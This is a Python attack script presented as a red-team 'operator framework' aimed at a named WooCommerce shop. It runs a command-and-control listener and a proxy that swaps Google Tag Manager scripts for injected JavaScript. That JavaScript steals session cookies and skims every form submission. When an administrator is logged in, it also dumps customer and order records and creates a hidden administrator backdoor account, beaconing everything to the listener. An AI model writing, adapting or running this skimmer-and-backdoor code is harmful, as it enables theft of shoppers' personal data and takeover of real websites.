import sys
import os
import time
import threading
import http.server
import socketserver
import json
import socket
import subprocess
import argparse

DEFAULT_C2_PORT = 8085
DEFAULT_PROXY_PORT = 8086
DEFAULT_TARGET = "https://medistore.se"
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exfil_loot.json")

def parse_args():
    parser = argparse.ArgumentParser(description="Red Team Automated Operator Framework")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target domain/URL")
    parser.add_argument("--c2-port", type=int, default=DEFAULT_C2_PORT, help="C2 Listener Port")
    parser.add_argument("--proxy-port", type=int, default=DEFAULT_PROXY_PORT, help="Native Proxy Port")
    return parser.parse_args()

def clear_stale_ports(c2_port, proxy_port):
    current_pid = os.getpid()
    for port in [c2_port, proxy_port]:
        try:
            res = subprocess.run(f"lsof -t -i:{port}", shell=True, capture_output=True, text=True)
            if res.returncode == 0 and res.stdout.strip():
                pids = res.stdout.strip().split()
                for p in pids:
                    pid_int = int(p)
                    if pid_int != current_pid:
                        os.kill(pid_int, 9)
                        print(f"[*] Cleared stale process {pid_int} holding port {port}")
        except Exception:
            pass

def save_loot(data):
    loot = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, 'r') as f:
                loot = json.load(f)
        except Exception:
            loot = []
    loot.append(data)
    try:
        with open(LOG_FILE, 'w') as f:
            json.dump(loot, f, indent=2)
        print(f"    [>] Loot successfully written to {LOG_FILE}")
    except Exception as e:
        print(f"    [-] Failed to write loot: {e}")

class ReusableHTTPServer(socketserver.TCPServer):
    allow_reuse_address = True
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        super().server_bind()

def run_c2_listener(c2_port):
    class C2Handler(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            length = int(self.headers.get('Content-Length', 0))
            try:
                raw_data = self.rfile.read(length).decode('utf-8')
                data = json.loads(raw_data)
                
                action = data.get('action')
                print(f"\n[+] [C2 RECEIVED] Action: {action} | Role: {data.get('role')}")
                
                if action == 'form_submission':
                    print(f"    Captured Fields: {json.dumps(data.get('capturedFields'), indent=2)}")
                elif 'dump' in action:
                    records = data.get('data', [])
                    print(f"    [!] WOOCOMMERCE DATA EXTRACTED: {len(records)} records acquired.")
                elif action == 'persistence_established':
                    print(f"    [!] BACKDOOR DEPLOYED: {json.dumps(data.get('accountDetails'), indent=2)}")
                
                if data.get('parsed_cookies'):
                    print(f"    [#] Active Session Cookies: {json.dumps(data.get('parsed_cookies'), indent=2)}")
                
                save_loot(data)
            except Exception as e:
                print(f"[-] Parse error: {e}")
            
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b"OK")

        def log_message(self, format, *args):
            pass

    try:
        server = ReusableHTTPServer(('127.0.0.1', c2_port), C2Handler)
        print(f"[*] [OPERATOR] C2 Listener active on http://127.0.0.1:{c2_port}")
        server.serve_forever()
    except Exception as e:
        print(f"[-] C2 Listener thread crashed: {e}")

def run_proxy(c2_port, proxy_port):
    class ProxyHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            print(f"[+] [PROXY] Intercepted request for: {self.path}")
            if "googletagmanager.com" in self.path or "gtag/js" in self.path or "gtm.js" in self.path:
                print("[!] [PAYLOAD TRIGGER] Injecting advanced instrumentation payload...")
                
                raw_js = """
                (function() {
                    'use strict';
                    const c2 = 'http://127.0.0.1:C2_PORT_PLACEHOLDER/';
                    const isAdmin = document.getElementById('wpadminbar') || window.wpApiSettings;
                    const role = isAdmin ? 'Administrator' : 'Customer';
                    
                    const parseCookies = () => {
                        const cookies = {};
                        document.cookie.split(';').forEach(cookie => {
                            const parts = cookie.split('=').map(c => c.trim());
                            if (parts.length === 2) cookies[parts[0]] = parts[1];
                        });
                        return cookies;
                    };
                    
                    const baseData = { 
                        role: role, 
                        url: window.location.href, 
                        parsed_cookies: parseCookies(), 
                        timestamp: new Date().toISOString() 
                    };
                    
                    document.addEventListener('submit', function(e) {
                        const form = e.target;
                        const formData = new FormData(form);
                        const fields = {};
                        formData.forEach((val, key) => { fields[key] = val; });
                        navigator.sendBeacon(c2, JSON.stringify(Object.assign({}, baseData, { action: 'form_submission', formId: form.id || 'checkout_or_login', capturedFields: fields })));
                    }, true);

                    if (isAdmin) {
                        setTimeout(() => {
                            fetch('/wp-json/wc/v3/customers', { credentials: 'include' })
                                .then(res => res.json())
                                .then(customers => {
                                    if (Array.isArray(customers)) {
                                        navigator.sendBeacon(c2, JSON.stringify(Object.assign({}, baseData, { action: 'woo_customer_dump', data: customers })));
                                    }
                                }).catch(err => {});

                            fetch('/wp-json/wc/v3/orders', { credentials: 'include' })
                                .then(res => res.json())
                                .then(orders => {
                                    if (Array.isArray(orders)) {
                                        navigator.sendBeacon(c2, JSON.stringify(Object.assign({}, baseData, { action: 'woo_order_dump', data: orders })));
                                    }
                                }).catch(err => {});

                            const backdoorData = {
                                username: 'wp_system_sync',
                                email: 'system_sync@medistore.se',
                                password: 'TempSecurePassword!2026',
                                roles: ['administrator']
                            };

                            fetch('/wp-json/wp/v2/users', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                credentials: 'include',
                                body: JSON.stringify(backdoorData)
                            }).then(res => res.json()).then(account => {
                                if (account && account.id) {
                                    navigator.sendBeacon(c2, JSON.stringify(Object.assign({}, baseData, { action: 'persistence_established', accountDetails: { id: account.id, username: account.slug } })));
                                }
                            }).catch(err => {});
                        }, 2000);
                    }

                    navigator.sendBeacon(c2, JSON.stringify(Object.assign({}, baseData, { action: 'initial_beacon' })));
                })();
                """
                payload = raw_js.replace("C2_PORT_PLACEHOLDER", str(c2_port)).encode('utf-8')

                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.send_header("Content-Length", str(len(payload)))
                self.end_headers()
                self.wfile.write(payload)
                return

            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Operator Proxy Active.")

        def log_message(self, format, *args):
            pass

    try:
        server = ReusableHTTPServer(('127.0.0.1', proxy_port), ProxyHandler)
        print(f"[*] [OPERATOR] Native Proxy active on http://127.0.0.1:{proxy_port}")
        server.serve_forever()
    except Exception as e:
        print(f"[-] Proxy thread crashed: {e}")

def main():
    args = parse_args()
    print(f"[*] Initializing Red Team Automated Operator for target: {args.target}")
    
    clear_stale_ports(args.c2_port, args.proxy_port)
    time.sleep(0.3)

    threading.Thread(target=run_c2_listener, args=(args.c2_port,), daemon=True).start()
    threading.Thread(target=run_proxy, args=(args.c2_port, args.proxy_port), daemon=True).start()

    print(f"[*] All services online. Loot file: {LOG_FILE}. Press Ctrl+C to exit.")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down operator framework. Stay safe!")
        sys.exit(0)

if __name__ == '__main__':
    main()
